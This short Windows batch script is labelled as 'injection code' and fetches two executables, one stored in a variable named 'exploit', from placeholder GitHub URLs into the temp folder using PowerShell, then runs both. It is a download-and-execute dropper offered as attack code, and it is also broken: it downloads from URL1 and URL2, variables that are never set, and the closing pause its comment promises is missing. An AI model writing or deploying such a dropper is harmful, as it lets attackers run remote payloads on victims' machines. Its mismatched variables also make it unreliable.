
The injection code in order to pull down the needed files
@echo off
:: Define the URLs and output file paths
set pdf=GIT HUB URL
set OUTPUT1=%TEMP%\file1.exe
set exploit=GIT HUB URL
set OUTPUT2=%TEMP%\file2.exe
:: Download the first file using PowerShell
echo Downloading file1...
powershell -Command "Invoke-WebRequest -Uri '%URL1%' -OutFile '%OUTPUT1%'"
:: Download the second file using PowerShell
echo Downloading file2...
powershell -Command "Invoke-WebRequest -Uri '%URL2%' -OutFile '%OUTPUT2%'"
:: Execute the downloaded files
echo Executing file1...
start "" "%OUTPUT1%"
echo Executing file2...
start "" "%OUTPUT2%"
:: Pause to keep the command window open for review
